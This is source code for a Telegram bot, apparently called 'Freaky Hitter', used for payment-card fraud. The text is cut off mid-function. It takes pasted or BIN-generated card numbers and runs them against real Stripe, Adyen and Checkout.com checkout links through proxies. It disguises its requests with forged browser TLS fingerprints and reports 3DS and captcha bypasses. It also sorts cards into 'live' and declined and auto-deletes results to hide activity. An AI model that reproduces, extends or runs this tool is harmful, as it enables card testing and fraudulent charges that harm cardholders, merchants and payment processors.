import os
import asyncio
import re
import asyncpg
from typing import Optional, Tuple, List, Dict
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import aiohttp
import html
from aiogram.types import FSInputFile

# --- GLOBALLY MONKEYPATCH REQUESTS WITH CURL_CFFI FOR BROWSER TLS FINGERPRINTS ---
import requests
from curl_cffi.requests import Session as CurlSession
from curl_cffi.requests import post as curl_post
from curl_cffi.requests import get as curl_get
from curl_cffi.requests import request as curl_request

def get_impersonate_target(headers):
    if not headers:
        return 'chrome120'
    ua = ""
    for k, v in headers.items():
        if k.lower() == 'user-agent':
            ua = str(v)
            break
    if not ua:
        return 'chrome120'
    ua_lower = ua.lower()
    if 'android' in ua_lower:
        return 'chrome_android'
    elif 'iphone' in ua_lower or 'ipad' in ua_lower:
        return 'safari_ios'
    elif 'firefox' in ua_lower:
        return 'firefox120'
    elif 'safari' in ua_lower and 'chrome' not in ua_lower:
        return 'safari17'
    return 'chrome120'

class ImpersonatedSession(CurlSession):
    def __init__(self, *args, **kwargs):
        kwargs.setdefault('impersonate', 'chrome120')
        super().__init__(*args, **kwargs)
        
    def request(self, method, url, *args, **kwargs):
        target = get_impersonate_target(kwargs.get('headers') or self.headers)
        kwargs.setdefault('impersonate', target)
        return super().request(method, url, *args, **kwargs)

requests.Session = ImpersonatedSession

def wrapped_post(url, data=None, json=None, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_post(url, data=data, json=json, **kwargs)

def wrapped_get(url, params=None, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_get(url, params=params, **kwargs)

def wrapped_request(method, url, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_request(method, url, **kwargs)

requests.post = wrapped_post
requests.get = wrapped_get
requests.request = wrapped_request
# ---------------------------------------------------------------------------------

from hitter_core import CardGenerator, ConcurrentHitter, STRIPE_DECLINE_CODES, ProxyManager
from file_tools import clean_and_sort_cards_text, split_text_n_parts, filter_by_bin_prefix, group_text_by_country


load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN") or os.getenv("BOT_TOKEN")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID")
OWNER_ID = os.getenv("OWNER_ID")

# Setup bot
dp = Dispatcher()
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

import time
from datetime import datetime
from aiogram import BaseMiddleware

# Global store for active sessions & owner controls
active_sessions = {}
db_pool = None
approved_users_set = set()
registered_users_set = set()
banned_users_set = set()
maintenance_mode = False
gate_stripe_enabled = True
gate_adyen_enabled = True
bot_start_time = time.time()

async def check_access_and_register(event_user: types.User, message_or_cb) -> bool:
    """Checks ban status & maintenance mode, auto-registers user and logs new registrations to LOG_GROUP_ID."""
    user_id = event_user.id
    
    # 1. Ban Check
    if user_id in banned_users_set and str(user_id) != str(OWNER_ID):
        msg = "⛔ <b>Access Revoked</b>\n<code>Your user ID has been blacklisted from using this bot.</code>"
        if isinstance(message_or_cb, types.Message):
            await message_or_cb.answer(msg)
        elif isinstance(message_or_cb, types.CallbackQuery):
            await message_or_cb.answer("Access Revoked: You are banned.", show_alert=True)
        return False
        
    # 2. Maintenance Check
    if maintenance_mode and str(user_id) != str(OWNER_ID):
        msg = "🚧 <b>Maintenance Mode Active</b>\n<code>The bot is currently undergoing maintenance. Please try again later.</code>"
        if isinstance(message_or_cb, types.Message):
            await message_or_cb.answer(msg)
        elif isinstance(message_or_cb, types.CallbackQuery):
            await message_or_cb.answer("Maintenance Mode Active", show_alert=True)
        return False

    # 3. Auto Register & Telemetry Log
    if user_id not in registered_users_set:
        registered_users_set.add(user_id)
        if db_pool:
            try:
                async with db_pool.acquire() as conn:
                    await conn.execute("""
                        INSERT INTO registered_users (user_id, username, first_name)
                        VALUES ($1, $2, $3)
                        ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name
                    """, user_id, event_user.username or "", event_user.first_name or "")
            except Exception as e:
                print(f"Failed to register user in DB: {e}")

        # Send Telegram notification to log group
        if LOG_GROUP_ID:
            try:
                user_name = html.escape(event_user.first_name or "User")
                user_tag = f"@{event_user.username}" if event_user.username else "N/A"
                log_msg = (
                    f"👤 <b>New User Registered</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>Name:</b> {user_name} ({user_tag})\n"
                    f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                    f"📅 <b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
                await bot.send_message(LOG_GROUP_ID, log_msg)
            except Exception as e:
                print(f"Failed to log user registration: {e}")
                
    return True

class AccessControlMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = getattr(event, 'from_user', None)
        if user:
            allowed = await check_access_and_register(user, event)
            if not allowed:
                return
        return await handler(event, data)

dp.message.outer_middleware(AccessControlMiddleware())
dp.callback_query.outer_middleware(AccessControlMiddleware())


@dp.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎", callback_data="show_commands")]
    ])
    
    welcome_text = (
        "🩸 <b>Welcome to Freaky Hitter</b> 🩸\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<i>I've been waiting for you...</i>\n\n"
        "Tell me what we're breaking today. No checkout is safe, no proxy is fast enough, and I won't stop until it bleeds green.\n\n"
        "Feed me the cards. Let the obsession begin.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👉 Use <code>/cmds</code> or click below to unlock my secrets."
    )
    await message.answer(welcome_text, reply_markup=markup)

@dp.message(Command("cmds"))
async def cmds_command(message: types.Message) -> None:
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝙃𝙄𝙏𝙏𝙀𝙍", callback_data="menu_hitter"),
            InlineKeyboardButton(text="𝙏𝙊𝙊𝙇𝙎", callback_data="menu_tools")
        ]
    ])
    commands_text = (
        "<b>COMMANDS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<i>Select a command category below to view details:</i>"
    )
    await message.answer(commands_text, reply_markup=markup)

@dp.message(Command("approve"))
async def approve_command(message: types.Message):
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        await message.answer("<b>Error</b>\n<code>Unauthorized command. Only the owner can use /approve.</code>")
        return

    args = message.text.split(" ")
    if len(args) < 2:
        await message.answer("<b>Error</b>\n<code>Usage: /approve [userid]</code>")
        return

    target_id_str = args[1].strip()
    if not target_id_str.isdigit():
        await message.answer("<b>Error</b>\n<code>Invalid User ID. Must be numeric.</code>")
        return

    target_id = int(target_id_str)
    approved_users_set.add(target_id)

    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO approved_users (user_id)
                    VALUES ($1)
                    ON CONFLICT (user_id) DO NOTHING
                """, target_id)
        except Exception as e:
            print(f"Failed to save approved status: {e}")

    await message.answer(f"✅ <b>Approved</b>\n<code>User ID {target_id} has been approved. Hitting output messages will not be auto-deleted.</code>")

# ==================== LETHAL OWNER COMMANDS ====================

@dp.message(Command("admin", "stats"))
async def admin_command(message: types.Message):
    if not OWNER_ID or str(message.from_user.id) != str(OWNER_ID):
        await message.answer("❌ <b>Unauthorized</b>\n<code>Only the bot owner can access administrative stats.</code>")
        return
        
    uptime_sec = int(time.time() - bot_start_time)
    hours, remainder = divmod(uptime_sec, 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    uptime_str = f"{days}d {hours}h {minutes}m {seconds}s"
    
    total_registered = len(registered_users_set)
    total_banned = len(banned_users_set)
    total_approved = len(approved_users_set)
    active_tasks = len(active_sessions)
    
    maint_str = "🟢 OFF (Public Mode)" if not maintenance_mode else "🔴 ON (Owner Only)"
    stripe_str = "🟢 ACTIVE" if gate_stripe_enabled else "🔴 DISABLED"
    adyen_str = "🟢 ACTIVE" if gate_adyen_enabled else "🔴 DISABLED"
    db_str = "🟢 Connected (Supabase)" if db_pool else "🔴 Disconnected"
    
    msg = (
        "👑 <b>LETHAL OWNER DASHBOARD</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱ <b>Uptime:</b> <code>{uptime_str}</code>\n"
        f"🗄 <b>Database:</b> {db_str}\n\n"
        f"👥 <b>Registered Users:</b> <code>{total_registered}</code>\n"
        f"💎 <b>Approved Users:</b> <code>{total_approved}</code>\n"
        f"🚫 <b>Banned Users:</b> <code>{total_banned}</code>\n"
        f"⚡ <b>Active Sessions:</b> <code>{active_tasks}</code>\n\n"
        f"🚧 <b>Maintenance Mode:</b> {maint_str}\n"
        f"💳 <b>Stripe Gate:</b> {stripe_str}\n"
        f"💎 <b>Adyen Gate:</b> {adyen_str}\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await message.answer(msg)

@dp.message(Command("broadcast"))
async def broadcast_command(message: types.Message):
    if not OWNER_ID or str(message.from_user.id) != str(OWNER_ID):
        await message.answer("❌ <b>Unauthorized</b>")
        return
        
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ <b>Usage:</b> <code>/broadcast <your_message_here></code>")
        return
        
    broadcast_text = parts[1].strip()
    status_msg = await message.answer("📢 <b>Sending broadcast message...</b>")
    
    sent_count = 0
    failed_count = 0
    
    for uid in list(registered_users_set):
        try:
            await bot.send_message(uid, f"📢 <b>ANNOUNCEMENT</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{broadcast_text}")
            sent_count += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed_count += 1
            
    await status_msg.edit_text(
        f"📢 <b>Broadcast Completed</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Successfully Sent:</b> {sent_count}\n"
        f"❌ <b>Failed/Blocked:</b> {failed_count}"
    )

@dp.message(Command("ban"))
async def ban_command(message: types.Message):
    if not OWNER_ID or str(message.from_user.id) != str(OWNER_ID):
        await message.answer("❌ <b>Unauthorized</b>")
        return
        
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await message.answer("⚠️ <b>Usage:</b> <code>/ban <user_id> [reason]</code>")
        return
        
    target_id = int(parts[1].strip())
    reason = parts[2].strip() if len(parts) > 2 else "No reason specified"
    
    banned_users_set.add(target_id)
    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO banned_users (user_id, reason)
                    VALUES ($1, $2)
                    ON CONFLICT (user_id) DO UPDATE SET reason = EXCLUDED.reason
                """, target_id, reason)
        except Exception as e:
            print(f"Failed to save ban: {e}")
            
    await message.answer(f"🚫 <b>User Banned</b>\n<code>User ID {target_id} has been blacklisted.\nReason: {reason}</code>")

@dp.message(Command("unban"))
async def unban_command(message: types.Message):
    if not OWNER_ID or str(message.from_user.id) != str(OWNER_ID):
        await message.answer("❌ <b>Unauthorized</b>")
        return
        
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await message.answer("⚠️ <b>Usage:</b> <code>/unban <user_id></code>")
        return
        
    target_id = int(parts[1].strip())
    if target_id in banned_users_set:
        banned_users_set.remove(target_id)
        
    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.execute("DELETE FROM banned_users WHERE user_id = $1", target_id)
        except Exception as e:
            print(f"Failed to remove ban from DB: {e}")
            
    await message.answer(f"✅ <b>User Unbanned</b>\n<code>User ID {target_id} has been unblacklisted.</code>")

@dp.message(Command("maintenance"))
async def maintenance_command(message: types.Message):
    global maintenance_mode
    if not OWNER_ID or str(message.from_user.id) != str(OWNER_ID):
        await message.answer("❌ <b>Unauthorized</b>")
        return
        
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or parts[1].lower() not in ('on', 'off'):
        await message.answer("⚠️ <b>Usage:</b> <code>/maintenance on</code> OR <code>/maintenance off</code>")
        return
        
    setting = parts[1].lower()
    maintenance_mode = (setting == 'on')
    
    state_str = "🔴 <b>ACTIVATED (Owner Only Mode)</b>" if maintenance_mode else "🟢 <b>DEACTIVATED (Public Access Restored)</b>"
    await message.answer(f"🚧 <b>Maintenance Mode:</b> {state_str}")

@dp.message(Command("gate"))
async def gate_command(message: types.Message):
    global gate_stripe_enabled, gate_adyen_enabled
    if not OWNER_ID or str(message.from_user.id) != str(OWNER_ID):
        await message.answer("❌ <b>Unauthorized</b>")
        return
        
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3 or parts[1].lower() not in ('stripe', 'adyen') or parts[2].lower() not in ('on', 'off'):
        await message.answer("⚠️ <b>Usage:</b> <code>/gate <stripe|adyen> <on|off></code>")
        return
        
    target_gate = parts[1].lower()
    state = (parts[2].lower() == 'on')
    
    if target_gate == 'stripe':
        gate_stripe_enabled = state
        status = "🟢 ACTIVE" if state else "🔴 DISABLED"
        await message.answer(f"💳 <b>Stripe Gateway Gate:</b> {status}")
    elif target_gate == 'adyen':
        gate_adyen_enabled = state
        status = "🟢 ACTIVE" if state else "🔴 DISABLED"
        await message.answer(f"💎 <b>Adyen Gateway Gate:</b> {status}")

def extract_clean_site_domain(merchant: str, url_str: str) -> str:
    """Extracts clean site domain e.g. www.openart.ai or manus.ai."""
    if not url_str:
        return ""
    if not url_str.startswith("http://") and not url_str.startswith("https://"):
        url_str = "https://" + url_str
    try:
        domain = urllib.parse.urlparse(url_str).netloc.split(":")[0]
        # If domain is a gateway checkout domain (stripe checkout / adyen link), infer domain from merchant name
        if domain in ('checkout.stripe.com', 'invoice.stripe.com', 'pay.stripe.com', 'eu.adyen.link', 'adyen.link', 'test.adyen.link'):
            clean_m = re.sub(r'[^\w\s]', '', merchant or '').strip().lower().replace(' ', '')
            if clean_m and clean_m not in ('unknown', 'stripemerchant', 'adyenmerchant'):
                return f"www.{clean_m}.com" if not clean_m.endswith('.com') else clean_m
            return domain
        return domain
    except Exception:
        return ""

def extract_success_url_line(res: dict) -> str:
    """Extracts final/success/receipt/confirmation URL line on successful payment."""
    if not res.get('success'):
        return ""
    success_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
    if success_url:
        escaped_url = html.escape(str(success_url))
        return f"\n🔗 <b>Success URL:</b> {escaped_url}"
    return ""

def is_session_expired_err(res: dict) -> bool:
    """Check if response indicates a non-reusable single-use pay link exhaustion or expired session."""
    reason = str(res.get('error') or res.get('decline_code') or '').lower()
    raw_resp = str(res.get('raw_response') or '').lower()
    dec_code = str(res.get('decline_code') or '').lower()

    if '903' in reason or '903' in dec_code or 'internal error' in reason:
        return False

    if any(card_err in reason or card_err in raw_resp for card_err in ['card_expired', 'expired_card', 'card expired', 'invalid_expiry']):
        return False

    if res.get('session_expired'):
        return True
    if dec_code.startswith('link_') or 'already consumed' in reason or 'link_completed' in dec_code or 'link is completed' in reason:
        return True
    if res.get('pbl_reusable') is True:
        return False

    return any(k in reason or k in raw_resp for k in [
        'single-use link exhausted', 'checkout_session_expired', 'pay by link exhausted',
        'no such payment_intent', 'no such checkout.session'
    ])

def parse_cards_input(payload_tokens: list, raw_payload: str):
    """
    Parses cards from user payload.
    Supports:
    1. Single or Multiple CCs (up to 10): /hit [url] [cc1] [cc2] ... [cc10]
    2. BIN generation: /hit [url] [bin_pattern] [count=10] (defaults to 10 if count omitted)
    """
    cards = []

    # 1. Direct card regex matching
    matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
    if matches:
        for m in matches:
            cards.append({
                'card': m[0],
                'month': m[1].zfill(2),
                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
                'cvv': m[3]
            })
        if len(cards) > 10:
            return None, f"Submission of {len(cards)} cards rejected. Max concurrent limit is 10."
        return cards, None

    # 2. Check for BIN pattern (with or without count)
    if payload_tokens:
        count_val = payload_tokens[-1]
        count = 10  # Default count to 10 if not specified
        potential_bin = ""

        if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
            count = int(count_val)
            potential_bin = "".join(payload_tokens[:-1]).strip()
        else:
            potential_bin = "".join(payload_tokens).strip()

        clean_bin_prefix = potential_bin.split('|')[0].lower().replace(' ', '')
        if 'x' in clean_bin_prefix or (clean_bin_prefix.isdigit() and len(clean_bin_prefix) >= 6 and len(clean_bin_prefix) < 16):
            if count > 10:
                return None, "Maximum batch limit is 10 concurrent requests."
            from generators import generate_bin_cards
            raw_gen_cards = generate_bin_cards(potential_bin, count)
            for gc in raw_gen_cards:
                gp = gc.split('|')
                cards.append({'card': gp[0], 'month': gp[1], 'year': gp[2], 'cvv': gp[3]})
            if not cards:
                return None, "BIN pattern generation failed."
            return cards, None

    # 3. Single card fallback
    clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
    clean_cc = clean_cc.replace('/', '|')
    cc_parts = [p for p in clean_cc.split('|') if p]
    if len(cc_parts) == 4:
        cards.append({
            'card': cc_parts[0],
            'month': cc_parts[1].zfill(2),
            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
            'cvv': cc_parts[3]
        })
        return cards, None

    return None, "Invalid card formatting. Expected: <code>card|mm|yy|cvv</code> or <code>[bin_pattern] [count=10]</code>"


@dp.message(Command("hit"))
async def hit_command(message: types.Message):
    user_id = message.from_user.id
    
    if not gate_stripe_enabled and str(user_id) != str(OWNER_ID):
        await message.answer("🚧 <b>Gateway Offline</b>\n<code>Stripe checkout engine is currently disabled by admin.</code>")
        return

    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    # Naked IP Block - Mandatory Proxy Requirement
    if not await ProxyManager.has_proxies(user_id):
        await message.answer(
            "⚠️ <b>Proxy Required</b>\n"
            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
            "Load proxies using /proxy or /getproxy.</code>"
        )
        return

    raw_tokens = message.text.strip().split()
    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hit [url] [bin_pattern] [count=10]</code>")
        return
        
    url = raw_tokens[1]
    payload_tokens = raw_tokens[2:]
    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
    
    cards, err = parse_cards_input(payload_tokens, raw_payload)
    if err:
        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
        return
        
    status_msg = await message.answer("cooking....")
    
    card_blocks = []
    merchant_name = "Stripe Merchant"
    amount_str = None
    
    # Callback to update the Telegram message
    async def update_status(data):
        nonlocal merchant_name, amount_str
            
        if data["status"] == "analyzing":
            try: await status_msg.edit_text("cooking....")
            except Exception: pass
        elif data["status"] == "starting":
            info = data.get("url_info", {})
            merchant_name = info.get("merchant") or merchant_name
            raw_amt = info.get("amount")
            if isinstance(raw_amt, int) or (isinstance(raw_amt, str) and raw_amt.isdigit()):
                amount_str = f"USD {int(raw_amt)/100:.2f}"
            elif raw_amt:
                amount_str = str(raw_amt)
            
            site_domain = extract_clean_site_domain(merchant_name, url)
            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
            amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
            msg_text = f"<b>Stripe Checkout Hitter</b>\n\n{site_line}{amt_line}"
            try: await status_msg.edit_text(msg_text, disable_web_page_preview=True)
            except Exception: pass
            
        elif data["status"] == "progress":
            res = data["result"]

            card_obj = res.get('card', {})
            card_str = f"{card_obj.get('card')}|{card_obj.get('month')}|{card_obj.get('year')}|{card_obj.get('cvv')}"
            
            amt = res.get('amount')
            if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
                amount_str = f"USD {int(amt)/100:.2f}"
            elif amt:
                amount_str = str(amt)
                
            merchant_name = res.get('merchant') or merchant_name
            site_domain = extract_clean_site_domain(merchant_name, url)
            is_approved = user_id in approved_users_set

            if len(cards) == 1:
                if status_msg:
                    try: await status_msg.delete()
                    except: pass

                merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
                amt_val = amount_str or "USD 0.00"

                if res['success']:
                    tds_line = "\n<b><i>3DS</i></b> ➔ <b>BYPASSED [STRIPE]</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
                    cpt_line = "\n<b><i>Captcha</i></b> ➔ <b>BYPASSED [STRIPE]</b>" if res.get('captcha_bypassed') else ""
                    succ_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
                    succ_url_line = f"\n<b><i>Success URL</i></b> ➔ {html.escape(str(succ_url))}" if succ_url else ""
                    hit_text = (
                        f"✅ <b><i>PAYMENT SUCCESSFUL [STRIPE]</i></b>\n"
                        f"──────────────────────\n"
                        f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                        f"<b><i>Amount</i></b> ➔ {amt_val}\n"
                        f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                        f"<b><i>Time</i></b> ➔ {res['response_time']:.2f}s"
                        f"{tds_line}"
                        f"{cpt_line}"
                        f"{succ_url_line}\n"
                        f"──────────────────────"
                        f"{note_line}"
                    )
                else:
                    code_raw = str(res.get('decline_code') or res.get('error') or 'unknown').lower()
                    live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded', 'card_velocity_exceeded', 'authentication_required', 'challenge_required', '3d_secure', 'requires_action', 'requires_source_action', '3ds_challenge_unresolved']
                    is_live = any(c in code_raw for c in live_codes)
                    
                    if is_live and any(c in code_raw for c in ['requires_action', 'requires_source_action', '3ds_challenge_unresolved', 'challenge_required', 'authentication_required']):
                        status_title = "🟠 <b>3DS CHALLENGE PRESENTED [STRIPE]</b>"
                    elif is_live:
                        status_title = "🟢 <b>CARD LIVE [STRIPE]</b>"
                    else:
                        status_title = "❌ <b>PAYMENT UNSUCCESSFUL</b>"
                    
                    err_str = str(res.get('error') or '').strip()
                    decline_code = str(res.get('decline_code') or '').strip()
                    if 'raw:' in err_str or '{"' in err_str or 'rqdata_captcha' in err_str:
                        reason_msg = html.escape(decline_code.lower()) if decline_code and decline_code not in ('unknown', 'exception') else "stripe_captcha_bypass_failed"
                    elif decline_code and decline_code not in ('unknown', 'exception', 'declined', 'failed'):
                        reason_msg = html.escape(decline_code.lower())
                    elif err_str:
                        reason_msg = html.escape(err_str[:150])
                    else:
                        reason_msg = "card_declined"

                    hit_text = (
                        f"❌ <b><i>{status_title.replace('<b>', '').replace('</b>', '')}</i></b>\n"
                        f"──────────────────────\n"
                        f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                        f"<b><i>Amount</i></b> ➔ {amt_val}\n"
                        f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                        f"<b><i>Response</i></b> ➔ {reason_msg}\n"
                        f"<b><i>Time</i></b> ➔ {res['response_time']:.2f}s\n"
                        f"──────────────────────" + note_line
                    )

                sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
                if not is_approved:
                    async def auto_del_single(m):
                        await asyncio.sleep(30)
                        try: await m.delete()
                        except: pass
                    asyncio.create_task(auto_del_single(sent_msg))
            else:
                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
                
                if res['success']:
                    resp_str = "Succeeded"
                    if res.get('3ds_bypassed'):
                        resp_str += " (3DS Bypassed)"
                    elif res.get('captcha_bypassed'):
                        resp_str += " (Captcha Bypassed)"
                else:
                    resp_str = res.get('error') or res.get('decline_code') or "Card declined"

                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(str(resp_str))}"
                succ_url_line = extract_success_url_line(res)
                if succ_url_line:
                    block += succ_url_line
                card_blocks.append(block)

                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                blocks_text = "\n\n".join(card_blocks)

                msg_text = (
                    f"<b>Stripe Checkout Hitter</b>\n\n"
                    f"{blocks_text}\n\n"
                    f"{site_line}"
                    f"{amt_line}"
                )

                try:
                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception:
                    pass
                
        elif data["status"] in ("completed", "error"):
            if data["status"] == "error":
                err_msg = data.get("error", "Failed to process session.")
                site_domain = extract_clean_site_domain(merchant_name, url)
                site_line = f"\n\nSite: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"\n\nSite: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                if status_msg and len(cards) > 1:
                    try:
                        await status_msg.edit_text(
                            f"❌ <b>Error processing check:</b>\n<code>{html.escape(str(err_msg))}</code>{site_line}{amt_line}",
                            disable_web_page_preview=True
                        )
                    except Exception:
                        pass
                elif len(cards) == 1:
                    await message.reply(
                        f"❌ <b>Error processing check:</b>\n<code>{html.escape(str(err_msg))}</code>{site_line}{amt_line}",
                        disable_web_page_preview=True
                    )

            is_approved = user_id in approved_users_set
            if not is_approved and status_msg and len(cards) > 1 and data["status"] != "error":
                async def auto_del_stripe(m):
                    await asyncio.sleep(30)
                    try: await m.delete()
                    except: pass
                asyncio.create_task(auto_del_stripe(status_msg))
            if user_id in active_sessions:
                del active_sessions[user_id]

    hitter = ConcurrentHitter(user_id, url, cards, update_callback=update_status)
    active_sessions[user_id] = hitter
    
    async def safe_run():
        try:
            await hitter.run()
        except Exception as ex:
            if status_msg:
                try:
                    await status_msg.edit_text(f"❌ <b>Error processing session:</b>\n<code>{html.escape(str(ex))}</code>")
                except Exception:
                    pass
        finally:
            if user_id in active_sessions:
                del active_sessions[user_id]
                
    asyncio.create_task(safe_run())


@dp.message(Command("hitck"))
async def hitck_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    if not await ProxyManager.has_proxies(user_id):
        await message.answer(
            "⚠️ <b>Proxy Required</b>\n"
            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
            "Load proxies using /proxy or /getproxy.</code>"
        )
        return

    raw_tokens = message.text.strip().split()
    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitck [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitck [url] [bin_pattern] [count=10]</code>")
        return
        
    url = raw_tokens[1]
    payload_tokens = raw_tokens[2:]
    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
    
    cards, err = parse_cards_input(payload_tokens, raw_payload)
    if err:
        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
        return

    status_msg = await message.answer("cooking....")
    active_sessions[user_id] = True
    
    try:
        from checkout_hitter import CheckoutHitter
        proxy_data = await ProxyManager.get_random(user_id)
        checkout_engine = CheckoutHitter(url, proxy_data=proxy_data)
        
        card_blocks = []
        merchant_name = "Checkout.com Merchant"
        amount_str = None
        results = []

        for idx, card in enumerate(cards, 1):
            if user_id not in active_sessions:
                break
            res = await checkout_engine.hit(card, idx, user_id)
            results.append(res)
            
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            merchant_name = res.get('merchant') or merchant_name
            if res.get('amount'):
                amount_str = res['amount']

            site_domain = extract_clean_site_domain(merchant_name, url)

            if len(cards) > 1:
                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
                
                if res['success']:
                    resp_str = "Authorised"
                    if res.get('3ds_resolved') or res.get('3ds_bypassed'):
                        resp_str += " (3DS Bypassed)"
                else:
                    resp_str = res.get('error') or res.get('decline_code') or "Refused"

                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
                
                card_blocks.append(block)

                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                blocks_text = "\n\n".join(card_blocks)

                msg_text = (
                    f"<b>Checkout.com Hitter</b>\n\n"
                    f"{blocks_text}\n\n"
                    f"{site_line}"
                    f"{amt_line}"
                )

                try:
                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception:
                    pass

        is_approved = user_id in approved_users_set

        if len(cards) == 1 and results:
            if status_msg:
                try: await status_msg.delete()
                except: pass

            res = results[0]
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            merchant_name = res.get('merchant') or merchant_name
            amount_val = res.get('amount') or amount_str or "USD 0.00"
